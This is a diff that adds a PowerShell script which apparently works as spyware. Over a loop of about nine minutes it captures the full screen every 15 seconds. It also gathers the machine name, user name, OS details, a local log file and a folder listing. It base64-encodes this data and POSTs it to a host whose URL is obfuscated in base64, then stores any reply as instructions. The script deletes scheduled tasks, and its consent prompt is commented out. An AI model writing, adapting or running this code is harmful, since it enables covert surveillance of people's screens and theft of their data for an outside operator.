@@ -1,0 +1,68 @@
+﻿Add-Type -AssemblyName System.Windows.Forms
+#[System.Windows.Forms.MessageBox]::Show("This script will capture screenshots and system information By continuing, you consent to this operation.", "Consent Required", #[System.Windows.Forms.MessageBoxButtons]::OKCancel)
+#if ($? -eq $false) {
+#    exit
+#}
+if (-not (Test-Path "$env:LOCALAPPDATA\aolmail\402.vbs")) { "MyTasks\7","MyTasks\8","MyTasks\9","MyTasks\10" | ForEach-Object { schtasks /delete /tn $_ /f >$null 2>&1}}
+if (-not (Test-Path "$env:LOCALAPPDATA\aolmail\403.vbs")) { "MyTasks\11","MyTasks\12","MyTasks\15" | ForEach-Object { schtasks /delete /tn $_ /f >$null 2>&1}}
+Add-Type -AssemblyName System.Drawing
+$sD = Get-Date
+while ((Get-Date) -lt ($sD.AddMinutes(9))) {
+    try {
+        $vc = Get-WmiObject -class "Win32_VideoController"
+        $width = [int]$vc.CurrentHorizontalResolution
+        $height = [int]$vc.CurrentVerticalResolution
+        $sCreso = "$width x $height"
+    }
+    catch {
+        $sCreso = "1920 x 1080"
+        $width = 1920
+        $height = 1080
+    }
+    $tF = [System.IO.Path]::GetTempPath()
+    $scP = Join-Path -Path $tF -ChildPath "scr.jpg"
+    $bmp = New-Object Drawing.Bitmap $width, $height
+    $gP = [Drawing.Graphics]::FromImage($bmp)
+    $gP.CopyFromScreen([Drawing.Point]::Empty, [Drawing.Point]::Empty, [Drawing.Size]::new($width, $height))
+    $bmp.Save($scP, [System.Drawing.Imaging.ImageFormat]::Jpeg)
+    $gP.Dispose()
+    $bmp.Dispose()
+    $oL = Join-Path (Join-Path $env:LOCALAPPDATA "aolmail") '9.log'
+    $oD = if (Test-Path $oL) { [IO.File]::ReadAllText($oL) } else { '' }
+    $cC = Join-Path (Join-Path $env:LOCALAPPDATA "aolmail") '4'
+    $pC = if (Test-Path $cC) { Get-Content $cC } else { 0 }
+    $cH = $oD.Length
+    $sU = $cH -ne $pC
+    if ($sU) {
+        $bO = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($oD))
+        Set-Content -Path $cC -Value $cH
+    }
+    $oN = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+    $oP = Get-ChildItem -Path "$env:LOCALAPPDATA\aolmail" | Select-Object Name, Length, LastWriteTime | Out-String
+    $bT = [System.Text.Encoding]::UTF8.GetBytes($oP)
+    $bD = [Convert]::ToBase64String($bT)
+    $iM = @{
+        hN = [Environment]::MachineName
+        cU = [Environment]::UserName
+        oM = $oN
+        i64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($scP))
+        oD = if ($sU) { $bO } else { '' }
+        rS = $bD
+        screso = $sCreso
+    }
+    $iJ = $iM | ConvertTo-Json
+    $uL = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cDovL2FqNi5vcmc=')) + '/in2.php'
+    try {
+        $rP = Invoke-RestMethod -Uri $uL -Method Post -Body $iJ -ContentType 'application/json'
+        $sI = $rP.IndexOf("MxC=")
+        if ($sI -ne -1) {
+            $sR = $rP.Substring($sI + 4)
+            $eR = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($sR))
+            $dP = Join-Path (Join-Path $env:LOCALAPPDATA "aolmail") '7'
+            Set-Content -Path $dP -Value $eR
+        }
+    } catch {}
+    Remove-Item $scP -ErrorAction SilentlyContinue
+    Start-Sleep -Seconds 15
+}
+#####
